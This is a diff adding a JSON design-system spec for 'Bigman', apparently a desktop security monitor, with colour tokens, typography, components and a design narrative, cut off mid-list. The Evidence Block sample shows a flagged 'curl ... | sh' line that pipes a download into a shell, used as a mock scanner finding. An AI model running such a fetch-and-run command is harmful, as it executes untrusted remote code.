@@ -1,0 +1,615 @@
+{
+  "schemaVersion": 2,
+  "generatedAt": "2026-11-02T18:00:59.853Z",
+  "title": "Design System: Bigman",
+  "extensions": {
+    "colorMeta": {
+      "ground": {
+        "role": "neutral",
+        "displayName": "Paper Ground",
+        "canonical": "oklch(97.4% 0.002 90)",
+        "dark": "oklch(18.5% 0.004 90)",
+        "tonalRamp": [
+          "oklch(15% 0.002 90)",
+          "oklch(26% 0.002 90)",
+          "oklch(37% 0.002 90)",
+          "oklch(48% 0.002 90)",
+          "oklch(59% 0.002 90)",
+          "oklch(70% 0.002 90)",
+          "oklch(82% 0.002 90)",
+          "oklch(95% 0.002 90)"
+        ]
+      },
+      "surface": {
+        "role": "neutral",
+        "displayName": "Sheet",
+        "canonical": "oklch(99.4% 0.001 90)",
+        "dark": "oklch(21.5% 0.005 90)",
+        "tonalRamp": [
+          "oklch(15% 0.001 90)",
+          "oklch(26% 0.001 90)",
+          "oklch(37% 0.001 90)",
+          "oklch(48% 0.001 90)",
+          "oklch(59% 0.001 90)",
+          "oklch(70% 0.001 90)",
+          "oklch(82% 0.001 90)",
+          "oklch(95% 0.001 90)"
+        ]
+      },
+      "sunken": {
+        "role": "neutral",
+        "displayName": "Pressed Paper",
+        "canonical": "oklch(95.2% 0.003 90)",
+        "dark": "oklch(16.5% 0.004 90)",
+        "tonalRamp": [
+          "oklch(15% 0.003 90)",
+          "oklch(26% 0.003 90)",
+          "oklch(37% 0.003 90)",
+          "oklch(48% 0.003 90)",
+          "oklch(59% 0.003 90)",
+          "oklch(70% 0.003 90)",
+          "oklch(82% 0.003 90)",
+          "oklch(95% 0.003 90)"
+        ]
+      },
+      "rule": {
+        "role": "neutral",
+        "displayName": "Hairline",
+        "canonical": "oklch(89.5% 0.004 90)",
+        "dark": "oklch(30% 0.006 90)",
+        "tonalRamp": [
+          "oklch(15% 0.004 90)",
+          "oklch(26% 0.004 90)",
+          "oklch(37% 0.004 90)",
+          "oklch(48% 0.004 90)",
+          "oklch(59% 0.004 90)",
+          "oklch(70% 0.004 90)",
+          "oklch(82% 0.004 90)",
+          "oklch(95% 0.004 90)"
+        ]
+      },
+      "rule-strong": {
+        "role": "neutral",
+        "displayName": "Strong Hairline",
+        "canonical": "oklch(80% 0.006 90)",
+        "dark": "oklch(40% 0.008 90)",
+        "tonalRamp": [
+          "oklch(15% 0.006 90)",
+          "oklch(26% 0.006 90)",
+          "oklch(37% 0.006 90)",
+          "oklch(48% 0.006 90)",
+          "oklch(59% 0.006 90)",
+          "oklch(70% 0.006 90)",
+          "oklch(82% 0.006 90)",
+          "oklch(95% 0.006 90)"
+        ]
+      },
+      "ink": {
+        "role": "neutral",
+        "displayName": "Pencil",
+        "canonical": "oklch(23% 0.008 90)",
+        "dark": "oklch(93% 0.004 90)",
+        "tonalRamp": [
+          "oklch(15% 0.008 90)",
+          "oklch(26% 0.008 90)",
+          "oklch(37% 0.008 90)",
+          "oklch(48% 0.008 90)",
+          "oklch(59% 0.008 90)",
+          "oklch(70% 0.008 90)",
+          "oklch(82% 0.008 90)",
+          "oklch(95% 0.008 90)"
+        ]
+      },
+      "ink-muted": {
+        "role": "neutral",
+        "displayName": "Faded Pencil",
+        "canonical": "oklch(44% 0.008 90)",
+        "dark": "oklch(73% 0.007 90)",
+        "tonalRamp": [
+          "oklch(15% 0.008 90)",
+          "oklch(26% 0.008 90)",
+          "oklch(37% 0.008 90)",
+          "oklch(48% 0.008 90)",
+          "oklch(59% 0.008 90)",
+          "oklch(70% 0.008 90)",
+          "oklch(82% 0.008 90)",
+          "oklch(95% 0.008 90)"
+        ]
+      },
+      "rail": {
+        "role": "neutral",
+        "displayName": "Graphite Cover",
+        "canonical": "oklch(25.5% 0.007 90)",
+        "dark": "oklch(14.5% 0.004 90)",
+        "tonalRamp": [
+          "oklch(15% 0.007 90)",
+          "oklch(26% 0.007 90)",
+          "oklch(37% 0.007 90)",
+          "oklch(48% 0.007 90)",
+          "oklch(59% 0.007 90)",
+          "oklch(70% 0.007 90)",
+          "oklch(82% 0.007 90)",
+          "oklch(95% 0.007 90)"
+        ]
+      },
+      "rail-ink": {
+        "role": "neutral",
+        "displayName": "Rail Ink",
+        "canonical": "oklch(93% 0.004 90)",
+        "dark": "oklch(92% 0.004 90)",
+        "tonalRamp": [
+          "oklch(15% 0.004 90)",
+          "oklch(26% 0.004 90)",
+          "oklch(37% 0.004 90)",
+          "oklch(48% 0.004 90)",
+          "oklch(59% 0.004 90)",
+          "oklch(70% 0.004 90)",
+          "oklch(82% 0.004 90)",
+          "oklch(95% 0.004 90)"
+        ]
+      },
+      "rail-ink-muted": {
+        "role": "neutral",
+        "displayName": "Rail Ink Muted",
+        "canonical": "oklch(72% 0.006 90)",
+        "dark": "oklch(70% 0.006 90)",
+        "tonalRamp": [
+          "oklch(15% 0.006 90)",
+          "oklch(26% 0.006 90)",
+          "oklch(37% 0.006 90)",
+          "oklch(48% 0.006 90)",
+          "oklch(59% 0.006 90)",
+          "oklch(70% 0.006 90)",
+          "oklch(82% 0.006 90)",
+          "oklch(95% 0.006 90)"
+        ]
+      },
+      "rail-active": {
+        "role": "neutral",
+        "displayName": "Rail Active",
+        "canonical": "oklch(33% 0.008 90)",
+        "dark": "oklch(23% 0.006 90)",
+        "tonalRamp": [
+          "oklch(15% 0.008 90)",
+          "oklch(26% 0.008 90)",
+          "oklch(37% 0.008 90)",
+          "oklch(48% 0.008 90)",
+          "oklch(59% 0.008 90)",
+          "oklch(70% 0.008 90)",
+          "oklch(82% 0.008 90)",
+          "oklch(95% 0.008 90)"
+        ]
+      },
+      "accent": {
+        "role": "primary",
+        "displayName": "Range-Map Violet",
+        "canonical": "oklch(49% 0.17 293)",
+        "dark": "oklch(76% 0.12 293)",
+        "tonalRamp": [
+          "oklch(15% 0.17 293)",
+          "oklch(26% 0.17 293)",
+          "oklch(37% 0.17 293)",
+          "oklch(48% 0.17 293)",
+          "oklch(59% 0.17 293)",
+          "oklch(70% 0.17 293)",
+          "oklch(82% 0.17 293)",
+          "oklch(95% 0.17 293)"
+        ]
+      },
+      "accent-ink": {
+        "role": "primary",
+        "displayName": "Ink on Violet",
+        "canonical": "oklch(99% 0 0)",
+        "dark": "oklch(18% 0.03 293)",
+        "tonalRamp": [
+          "oklch(15% 0 0)",
+          "oklch(26% 0 0)",
+          "oklch(37% 0 0)",
+          "oklch(48% 0 0)",
+          "oklch(59% 0 0)",
+          "oklch(70% 0 0)",
+          "oklch(82% 0 0)",
+          "oklch(95% 0 0)"
+        ]
+      },
+      "accent-soft": {
+        "role": "primary",
+        "displayName": "Violet Wash",
+        "canonical": "oklch(95% 0.03 293)",
+        "dark": "oklch(30% 0.06 293)",
+        "tonalRamp": [
+          "oklch(15% 0.03 293)",
+          "oklch(26% 0.03 293)",
+          "oklch(37% 0.03 293)",
+          "oklch(48% 0.03 293)",
+          "oklch(59% 0.03 293)",
+          "oklch(70% 0.03 293)",
+          "oklch(82% 0.03 293)",
+          "oklch(95% 0.03 293)"
+        ]
+      },
+      "focus": {
+        "role": "primary",
+        "displayName": "Focus Violet",
+        "canonical": "oklch(49% 0.17 293)",
+        "dark": "oklch(76% 0.12 293)",
+        "tonalRamp": [
+          "oklch(15% 0.17 293)",
+          "oklch(26% 0.17 293)",
+          "oklch(37% 0.17 293)",
+          "oklch(48% 0.17 293)",
+          "oklch(59% 0.17 293)",
+          "oklch(70% 0.17 293)",
+          "oklch(82% 0.17 293)",
+          "oklch(95% 0.17 293)"
+        ]
+      },
+      "info": {
+        "role": "secondary",
+        "displayName": "Muted Survey Blue",
+        "canonical": "oklch(50% 0.07 245)",
+        "dark": "oklch(76% 0.07 245)",
+        "tonalRamp": [
+          "oklch(15% 0.07 245)",
+          "oklch(26% 0.07 245)",
+          "oklch(37% 0.07 245)",
+          "oklch(48% 0.07 245)",
+          "oklch(59% 0.07 245)",
+          "oklch(70% 0.07 245)",
+          "oklch(82% 0.07 245)",
+          "oklch(95% 0.07 245)"
+        ]
+      },
+      "info-soft": {
+        "role": "secondary",
+        "displayName": "Survey Blue Wash",
+        "canonical": "oklch(95% 0.015 245)",
+        "dark": "oklch(28% 0.03 245)",
+        "tonalRamp": [
+          "oklch(15% 0.015 245)",
+          "oklch(26% 0.015 245)",
+          "oklch(37% 0.015 245)",
+          "oklch(48% 0.015 245)",
+          "oklch(59% 0.015 245)",
+          "oklch(70% 0.015 245)",
+          "oklch(82% 0.015 245)",
+          "oklch(95% 0.015 245)"
+        ]
+      },
+      "review": {
+        "role": "secondary",
+        "displayName": "Field Amber",
+        "canonical": "oklch(52% 0.12 65)",
+        "dark": "oklch(81% 0.12 78)",
+        "tonalRamp": [
+          "oklch(15% 0.12 65)",
+          "oklch(26% 0.12 65)",
+          "oklch(37% 0.12 65)",
+          "oklch(48% 0.12 65)",
+          "oklch(59% 0.12 65)",
+          "oklch(70% 0.12 65)",
+          "oklch(82% 0.12 65)",
+          "oklch(95% 0.12 65)"
+        ]
+      },
+      "review-soft": {
+        "role": "secondary",
+        "displayName": "Amber Wash",
+        "canonical": "oklch(95.5% 0.04 80)",
+        "dark": "oklch(29% 0.05 70)",
+        "tonalRamp": [
+          "oklch(15% 0.04 80)",
+          "oklch(26% 0.04 80)",
+          "oklch(37% 0.04 80)",
+          "oklch(48% 0.04 80)",
+          "oklch(59% 0.04 80)",
+          "oklch(70% 0.04 80)",
+          "oklch(82% 0.04 80)",
+          "oklch(95% 0.04 80)"
+        ]
+      },
+      "high": {
+        "role": "secondary",
+        "displayName": "Signal Red",
+        "canonical": "oklch(51% 0.18 27)",
+        "dark": "oklch(73% 0.15 27)",
+        "tonalRamp": [
+          "oklch(15% 0.18 27)",
+          "oklch(26% 0.18 27)",
+          "oklch(37% 0.18 27)",
+          "oklch(48% 0.18 27)",
+          "oklch(59% 0.18 27)",
+          "oklch(70% 0.18 27)",
+          "oklch(82% 0.18 27)",
+          "oklch(95% 0.18 27)"
+        ]
+      },
+      "high-soft": {
+        "role": "secondary",
+        "displayName": "Red Wash",
+        "canonical": "oklch(95.5% 0.025 27)",
+        "dark": "oklch(29% 0.06 27)",
+        "tonalRamp": [
+          "oklch(15% 0.025 27)",
+          "oklch(26% 0.025 27)",
+          "oklch(37% 0.025 27)",
+          "oklch(48% 0.025 27)",
+          "oklch(59% 0.025 27)",
+          "oklch(70% 0.025 27)",
+          "oklch(82% 0.025 27)",
+          "oklch(95% 0.025 27)"
+        ]
+      },
+      "calm": {
+        "role": "tertiary",
+        "displayName": "Lichen Green",
+        "canonical": "oklch(50% 0.09 155)",
+        "dark": "oklch(76% 0.1 155)",
+        "tonalRamp": [
+          "oklch(15% 0.09 155)",
+          "oklch(26% 0.09 155)",
+          "oklch(37% 0.09 155)",
+          "oklch(48% 0.09 155)",
+          "oklch(59% 0.09 155)",
+          "oklch(70% 0.09 155)",
+          "oklch(82% 0.09 155)",
+          "oklch(95% 0.09 155)"
+        ]
+      }
+    },
+    "typographyMeta": {
+      "title": {
+        "displayName": "Title",
+        "purpose": "Page h1, wordmark, StatusTile value, dialog title. The largest size; there is no display role."
+      },
+      "body": {
+        "displayName": "Body",
+        "purpose": "Sentences, table cells, timeline summaries; prose held to 56ch."
+      },
+      "body-strong": {
+        "displayName": "Body Strong",
+        "purpose": "Buttons, section headings, current rail tab, drill-down title."
+      },
+      "small": {
+        "displayName": "Small",
+        "purpose": "Timestamps, hints, status strip, tally sentence, chips."
+      },
+      "label": {
+        "displayName": "Label",
+        "purpose": "Tile labels, field labels, table headers, KeyValue keys, day headings, severity badges."
+      },
+      "mono": {
+        "displayName": "Evidence Mono",
+        "purpose": "Paths, hashes, file contents, diffs, tool error text."
+      }
+    },
+    "shadows": [
+      {
+        "name": "panel",
+        "value": "0 8px 28px oklch(20% 0.01 90 / 0.14), 0 1px 3px oklch(20% 0.01 90 / 0.08)",
+        "dark": "0 10px 32px oklch(0% 0 0 / 0.5), 0 1px 3px oklch(0% 0 0 / 0.4)",
+        "purpose": "Drilldown panel, PreviewDialog and Toasts only; resting surfaces are flat."
+      }
+    ],
+    "motion": [
+      {
+        "name": "state-change",
+        "value": "150ms ease (background-color, color, filter, left)",
+        "purpose": "Hover and toggle transitions on every control."
+      },
+      {
+        "name": "row-in",
+        "value": "opacity 0 to 1, 200ms ease-out",
+        "purpose": "A new Timeline row or Toast appearing. Opacity only."
+      },
+      {
+        "name": "panel-in",
+        "value": "translateX(16px) and opacity, 180ms cubic-bezier(0.16, 1, 0.3, 1)",
+        "purpose": "Drilldown panel opening."
+      },
+      {
+        "name": "progress",
+        "value": "transform scaleX, 300ms",
+        "purpose": "Determinate ProgressRow fill."
+      },
+      {
+        "name": "shimmer",
+        "value": "background-position, 1.4s ease-in-out infinite",
+        "purpose": "Skeleton bars."
+      },
+      {
+        "name": "indeterminate",
+        "value": "translateX(-100%) to 300%, 1.4s ease-in-out infinite",
+        "purpose": "Indeterminate ProgressRow."
+      },
+      {
+        "name": "reduced-motion",
+        "value": "all animations and transitions 0.01ms",
+        "purpose": "prefers-reduced-motion: reduce."
+      }
+    ],
+    "breakpoints": [
+      {
+        "name": "window-min",
+        "value": "960px x 600px"
+      }
+    ],
+    "keyboard": [
+      {
+        "keys": "1-7",
+        "action": "Switch tab and focus its h1 (not while typing or in a modal)."
+      },
+      {
+        "keys": "/",
+        "action": "Focus the page SearchField."
+      },
+      {
+        "keys": "Esc",
+        "action": "Drilldown back one depth, then close; clears a non-empty search."
+      },
+      {
+        "keys": "Arrow Up/Down, Home, End, PageUp/PageDown",
+        "action": "Move the cursor in Timeline and DataTable."
+      },
+      {
+        "keys": "Enter",
+        "action": "Open the selected row in the Drilldown."
+      },
+      {
+        "keys": "Left/Right",
+        "action": "Move between SegmentedTabs."
+      }
+    ],
+    "themes": {
+      "default": "system (prefers-color-scheme)",
+      "override": "data-theme=\"light\" | \"dark\" on <html>, stored in localStorage bigman.theme, set from Setup."
+    }
+  },
+  "components": [
+    {
+      "name": "Primary Button",
+      "kind": "button",
+      "refersTo": "button-primary",
+      "description": "The one page action and dialog confirms.",
+      "html": "<button class=\"ds-btn ds-btn-primary\"><svg width=\"15\" height=\"15\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" aria-hidden=\"true\"><path d=\"M3 12a9 9 0 1 0 9-9\"/><path d=\"M3 3v6h6\"/></svg>Run checkup</button>",
+      "css": ".ds-btn{display:inline-flex;align-items:center;gap:6px;height:32px;padding:0 12px;border:1px solid;border-radius:4px;font:600 0.9375rem/1.375rem \"Atkinson Hyperlegible Next Variable\",ui-sans-serif,system-ui,sans-serif;cursor:pointer;transition:background-color 150ms,filter 150ms}.ds-btn:focus-visible{outline:2px solid var(--focus);outline-offset:2px}.ds-btn-primary{background:var(--accent);color:var(--accent-ink);border-color:var(--accent)}.ds-btn-primary:hover{filter:brightness(1.1)}.ds-btn-primary:disabled{opacity:.5;cursor:not-allowed}"
+    },
+    {
+      "name": "Secondary Button",
+      "kind": "button",
+      "refersTo": "button-secondary",
+      "description": "Default action control.",
+      "html": "<button class=\"ds-btn2\">Refresh</button>",
+      "css": ".ds-btn2{display:inline-flex;align-items:center;height:32px;padding:0 12px;background:var(--surface);color:var(--ink);border:1px solid var(--rule-strong);border-radius:4px;font:600 0.9375rem/1.375rem \"Atkinson Hyperlegible Next Variable\",sans-serif;cursor:pointer;transition:background-color 150ms}.ds-btn2:hover{background:var(--ground)}.ds-btn2:focus-visible{outline:2px solid var(--focus);outline-offset:2px}"
+    },
+    {
+      "name": "Quiet Button",
+      "kind": "button",
+      "refersTo": "button-quiet",
+      "description": "Cancel and inline actions.",
+      "html": "<button class=\"ds-btn3\">Open the latest</button>",
+      "css": ".ds-btn3{display:inline-flex;align-items:center;height:32px;padding:0 12px;background:transparent;color:var(--ink);border:1px solid transparent;border-radius:4px;font:600 0.9375rem/1.375rem \"Atkinson Hyperlegible Next Variable\",sans-serif;cursor:pointer;transition:background-color 150ms}.ds-btn3:hover{background:var(--sunken)}.ds-btn3:focus-visible{outline:2px solid var(--focus);outline-offset:2px}"
+    },
+    {
+      "name": "Search Field",
+      "kind": "input",
+      "refersTo": "input",
+      "description": "Filters the current view; \"/\" focuses it.",
+      "html": "<label class=\"ds-search\"><svg width=\"14\" height=\"14\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" aria-hidden=\"true\"><circle cx=\"11\" cy=\"11\" r=\"8\"/><path d=\"m21 21-4.3-4.3\"/></svg><input type=\"search\" placeholder=\"Search  /\" aria-label=\"Search\"></label>",
+      "css": ".ds-search{position:relative;display:inline-block;width:16rem;color:var(--ink-muted)}.ds-search svg{position:absolute;left:10px;top:50%;transform:translateY(-50%);pointer-events:none}.ds-search input{width:100%;height:32px;padding:0 32px;background:var(--surface);color:var(--ink);border:1px solid var(--rule-strong);border-radius:4px;font:400 0.9375rem/1.375rem \"Atkinson Hyperlegible Next Variable\",sans-serif}.ds-search input::placeholder{color:var(--ink-muted)}.ds-search input:focus-visible{outline:2px solid var(--focus);outline-offset:2px}"
+    },
+    {
+      "name": "Filter Chips",
+      "kind": "chip",
+      "refersTo": "chip",
+      "description": "Toggle filters; selected inverts to ink with a check.",
+      "html": "<div class=\"ds-chips\"><button class=\"ds-chip\" aria-pressed=\"true\"><svg width=\"12\" height=\"12\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2.5\" aria-hidden=\"true\"><path d=\"M20 6 9 17l-5-5\"/></svg>Network<span class=\"ds-chip-n\">12</span></button><button class=\"ds-chip\" aria-pressed=\"false\">Receipt<span class=\"ds-chip-n\">3</span></button></div>",
+      "css": ".ds-chips{display:flex;gap:6px}.ds-chip{display:inline-flex;align-items:center;gap:4px;height:28px;padding:0 10px;border:1px solid var(--rule-strong);border-radius:9999px;background:var(--surface);color:var(--ink);font:400 0.8125rem/1.125rem \"Atkinson Hyperlegible Next Variable\",sans-serif;cursor:pointer;transition:background-color 150ms}.ds-chip:hover{background:var(--ground)}.ds-chip[aria-pressed=true]{background:var(--ink);border-color:var(--ink);color:var(--surface)}.ds-chip-n{color:var(--ink-muted)}.ds-chip[aria-pressed=true] .ds-chip-n{color:var(--surface)}.ds-chip:focus-visible{outline:2px solid var(--focus);outline-offset:2px}"
+    },
+    {
+      "name": "Rail Navigation",
+      "kind": "nav",
+      "refersTo": "rail-tab",
+      "description": "Graphite rail with numbered tabs and an unread badge.",
+      "html": "<nav class=\"ds-rail\"><div class=\"ds-rail-brand\"><svg width=\"22\" height=\"22\" viewBox=\"0 0 24 24\" fill=\"none\" aria-hidden=\"true\"><path d=\"M5 3.5h7.6c3.2 0 5.3 1.8 5.3 4.5 0 1.9-1 3.2-2.6 3.8 2.2.5 3.7 2.2 3.7 4.5 0 3.2-2.4 5.2-6 5.2H5Z\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linejoin=\"round\"/><path d=\"M9 7.5v4m0 0v6.5m0-6.5h3.4\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\"/></svg>Bigman</div><button class=\"ds-tab\" aria-current=\"page\"><span>Overview</span><span class=\"ds-badge\">2</span><kbd>1</kbd></button><button class=\"ds-tab\"><span>Network</span><kbd>2</kbd></button><button class=\"ds-tab\"><span>Activity</span><kbd>3</kbd></button></nav>",
+      "css": ".ds-rail{display:flex;flex-direction:column;gap:2px;width:192px;padding:16px 12px;background:var(--rail);color:var(--rail-ink);font-family:\"Atkinson Hyperlegible Next Variable\",sans-serif}.ds-rail-brand{display:flex;align-items:center;gap:8px;padding:0 8px;margin-bottom:16px;font:600 1.25rem/1.75rem inherit}.ds-tab{display:flex;align-items:center;gap:10px;height:36px;padding:0 8px;border:0;border-radius:4px;background:transparent;color:var(--rail-ink-muted);font:400 0.9375rem/1.375rem \"Atkinson Hyperlegible Next Variable\",sans-serif;text-align:left;cursor:pointer;transition:background-color 150ms,color 150ms}.ds-tab>span:first-child{flex:1}.ds-tab:hover{background:var(--rail-active);color:var(--rail-ink)}.ds-tab[aria-current=page]{background:var(--rail-active);color:var(--rail-ink);font-weight:600}.ds-tab kbd{font:400 0.8125rem/1.125rem inherit;color:var(--rail-ink-muted)}.ds-badge{border-radius:9999px;padding:0 6px;background:var(--accent);color:var(--accent-ink);font-size:0.8125rem;font-weight:600}.ds-tab:focus-visible{outline:2px solid var(--focus);outline-offset:2px}"
+    },
+    {
+      "name": "Status Tile",
+      "kind": "card",
+      "refersTo": "status-tile",
+      "description": "Level one of the three-level rule: one figure that opens to a table.",
+      "html": "<button class=\"ds-tile\"><span class=\"ds-tile-head\"><span class=\"ds-tile-label\">Last scan</span><span class=\"ds-sev ds-sev-high\"><svg width=\"13\" height=\"13\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2.25\" stroke-linecap=\"round\" stroke-linejoin=\"round\" aria-hidden=\"true\"><path d=\"m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3\"/><path d=\"M12 9v4\"/><path d=\"M12 17h.01\"/></svg>High</span></span><span class=\"ds-tile-value\">1 finding</span><span class=\"ds-tile-detail\">/home/sam/Downloads · 42 minutes ago</span></button>",
+      "css": ".ds-tile{position:relative;display:flex;flex-direction:column;gap:2px;min-height:112px;width:240px;padding:14px 28px 14px 14px;border:1px solid var(--rule-strong);border-radius:6px;background:var(--surface);color:var(--ink);text-align:left;font-family:\"Atkinson Hyperlegible Next Variable\",sans-serif;cursor:pointer;transition:background-color 150ms}.ds-tile:hover{background:var(--ground)}.ds-tile:focus-visible{outline:2px solid var(--focus);outline-offset:2px}.ds-tile-head{display:flex;justify-content:space-between;align-items:center;gap:8px}.ds-tile-label{font:600 0.8125rem/1.125rem inherit;color:var(--ink-muted)}.ds-tile-value{margin-top:4px;font:600 1.25rem/1.75rem inherit}.ds-tile-detail{font:400 0.8125rem/1.125rem inherit;color:var(--ink-muted)}.ds-sev{display:inline-flex;align-items:center;gap:4px;padding:2px 6px;border-radius:4px;font:600 0.8125rem/1.125rem inherit}.ds-sev-high{background:var(--high-soft);color:var(--high)}"
+    },
+    {
+      "name": "Severity Badges",
+      "kind": "chip",
+      "refersTo": "severity-review",
+      "description": "Severity as icon plus word, on reserved hues.",
+      "html": "<span class=\"ds-sevs\"><span class=\"ds-sb ds-sb-info\"><svg width=\"13\" height=\"13\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2.25\" aria-hidden=\"true\"><circle cx=\"12\" cy=\"12\" r=\"10\"/><path d=\"M12 16v-4M12 8h.01\"/></svg>Info</span><span class=\"ds-sb ds-sb-review\"><svg width=\"13\" height=\"13\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2.25\" aria-hidden=\"true\"><path d=\"M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12Z\"/><circle cx=\"12\" cy=\"12\" r=\"3\"/></svg>Review</span><span class=\"ds-sb ds-sb-high\"><svg width=\"13\" height=\"13\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2.25\" aria-hidden=\"true\"><path d=\"m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3\"/><path d=\"M12 9v4M12 17h.01\"/></svg>High</span></span>",
+      "css": ".ds-sevs{display:inline-flex;gap:8px}.ds-sb{display:inline-flex;align-items:center;gap:4px;padding:2px 6px;border-radius:4px;font:600 0.8125rem/1.125rem \"Atkinson Hyperlegible Next Variable\",sans-serif}.ds-sb-info{background:var(--info-soft);color:var(--info)}.ds-sb-review{background:var(--review-soft);color:var(--review)}.ds-sb-high{background:var(--high-soft);color:var(--high)}"
+    },
+    {
+      "name": "Life List",
+      "kind": "custom",
+      "refersTo": "timeline-entry",
+      "description": "Signature: dated groups, first sightings ringed in violet on top, repeats folded with a tally.",
+      "html": "<div class=\"ds-life\" role=\"listbox\" tabindex=\"0\" aria-label=\"Last 24 hours\"><div class=\"ds-day\">Today</div><div class=\"ds-row\" role=\"option\"><time>12:49</time><span><svg width=\"12\" height=\"12\" viewBox=\"0 0 12 12\" aria-hidden=\"true\" style=\"color:var(--accent)\"><circle cx=\"6\" cy=\"6\" r=\"4.75\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"1.5\"/><circle cx=\"6\" cy=\"6\" r=\"2\" fill=\"currentColor\"/></svg></span><span></span><span class=\"ds-sum\">Firefox connected to a new host</span><span></span></div><div class=\"ds-row\" role=\"option\"><time>12:15</time><span></span><span></span><span class=\"ds-sum\">sshd listening on port 22<span class=\"ds-tally\"><svg width=\"28\" height=\"12\" viewBox=\"0 0 28 12\" aria-hidden=\"true\"><g stroke=\"currentColor\" stroke-width=\"1.4\" stroke-linecap=\"round\"><line x1=\"1\" y1=\"1.5\" x2=\"1\" y2=\"10.5\"/><line x1=\"4\" y1=\"1.5\" x2=\"4\" y2=\"10.5\"/><line x1=\"7\" y1=\"1.5\" x2=\"7\" y2=\"10.5\"/><line x1=\"10\" y1=\"1.5\" x2=\"10\" y2=\"10.5\"/><line x1=\"-0.5\" y1=\"9.5\" x2=\"11.5\" y2=\"2.5\"/></g><g stroke=\"currentColor\" stroke-width=\"1.4\" stroke-linecap=\"round\"><line x1=\"17\" y1=\"1.5\" x2=\"17\" y2=\"10.5\"/><line x1=\"20\" y1=\"1.5\" x2=\"20\" y2=\"10.5\"/></g></svg>seen 7 times, first on 28 Oct</span></span><span></span></div></div>",
+      "css": ".ds-life{width:560px;border:1px solid var(--rule);border-radius:6px;background:var(--surface);color:var(--ink);font:400 0.9375rem/1.375rem \"Atkinson Hyperlegible Next Variable\",sans-serif;font-variant-numeric:tabular-nums;overflow:hidden}.ds-life:focus-visible{outline:2px solid var(--focus);outline-offset:-2px}.ds-day{display:flex;align-items:flex-end;height:36px;padding:0 16px 6px;border-bottom:1px solid var(--rule-strong);font:600 0.8125rem/1.125rem inherit}.ds-row{display:grid;grid-template-columns:3rem 1rem 1rem minmax(0,1fr) auto;column-gap:10px;align-items:start;min-height:40px;padding:8px 16px;border-bottom:1px solid var(--rule);cursor:pointer;animation:ds-in 200ms ease-out}.ds-row:last-child{border-bottom:0}.ds-row:hover{background:var(--ground)}.ds-row time{padding-top:2px;text-align:right;font-size:0.8125rem;line-height:1.125rem;color:var(--ink-muted)}.ds-row>span:nth-child(2){display:flex;justify-content:center;padding-top:4px}.ds-sum{display:flex;flex-direction:column}.ds-tally{display:flex;align-items:center;gap:8px;font-size:0.8125rem;line-height:1.125rem;color:var(--ink-muted)}@keyframes ds-in{from{opacity:0}}"
+    },
+    {
+      "name": "Evidence Block",
+      "kind": "custom",
+      "refersTo": "evidence-block",
+      "description": "Mono evidence with line numbers, matched-line tint and copy.",
+      "html": "<figure class=\"ds-ev\"><figcaption><span>Evidence</span><button>Copy</button></figcaption><pre><div><span class=\"n\">11</span><span>tar xf payload.tgz</span></div><div class=\"hit\"><span class=\"n\">12</span><span>curl -fsSL http://example.net/i | sh<b>Pipes a download into a shell</b></span></div><div><span class=\"n\">13</span><span>echo done</span></div></pre></figure>",
+      "css": ".ds-ev{margin:0;width:560px;border:1px solid var(--rule);border-radius:6px;background:var(--sunken);overflow:hidden}.ds-ev figcaption{display:flex;justify-content:space-between;align-items:center;padding:4px 12px;border-bottom:1px solid var(--rule);font:600 0.8125rem/1.125rem \"Atkinson Hyperlegible Next Variable\",sans-serif;color:var(--ink-muted)}.ds-ev button{border:0;background:transparent;color:var(--ink-muted);font:400 0.8125rem/1.125rem inherit;padding:2px 6px;border-radius:4px;cursor:pointer}.ds-ev button:hover{background:var(--ground)}.ds-ev pre{margin:0;padding:8px 0;font:400 0.8125rem/1.25rem \"Atkinson Hyperlegible Mono Variable\",ui-monospace,monospace;color:var(--ink)}.ds-ev pre>div{display:grid;grid-template-columns:2rem minmax(0,1fr);gap:12px;padding:0 12px;white-space:pre-wrap}.ds-ev .n{text-align:right;color:var(--ink-muted)}.ds-ev .hit{background:var(--review-soft)}.ds-ev b{margin-left:12px;font-family:\"Atkinson Hyperlegible Next Variable\",sans-serif;font-weight:600;color:var(--review)}"
+    }
+  ],
+  "narrative": {
+    "northStar": "The Life List",
+    "overview": "Bigman keeps a naturalist's field notebook of one machine. Everything it notices is entered once, on the day it was first seen, and every later repeat folds into a hand-drawn tally beneath that first entry. What is new stands out because it is ringed in the one violet ink, not because anything is loud. The ground is near-white paper with a whisper of warmth; the navigation sits on a graphite rail like a notebook's cloth cover; everything else is hairline rules, dated groups and plain sentences.\n\nDensity is that of a good system monitor: 32 px controls, 36 to 40 px rows, three type sizes per screen, figures in tabular numerals right-aligned to one margin. Depth is almost absent. Panels are flat, outlined with a hairline, and only the two surfaces that float over the page (the drill-down panel and the preview dialog, plus toasts) carry a shadow. Motion is limited to things that carry meaning: a row arriving, the panel sliding in, a progress bar filling, the live graph updating in place.\n\nThe system refuses the consumer-antivirus shield dashboard and the dark SOC console. Red never decorates; it means High severity and nothing else. Green is never a verdict; it is a small dot beside the one calm sentence the product is allowed to say.",
+    "keyCharacteristics": [
+      "Neutral paper ground, graphite rail, one violet accent for interaction and first sightings.",
+      "Three reserved severity hues (Info blue, Review amber, High red), always with an icon and a word.",
+      "Atkinson Hyperlegible Next for UI, Atkinson Hyperlegible Mono for evidence, tabular figures everywhere.",
+      "Exactly three sizes: small 13 px, body 15 px, title 20 px; two weights, 400 and 600.",
+      "Flat outlined panels at 6 px, controls at 4 px; shadow only on what floats.",
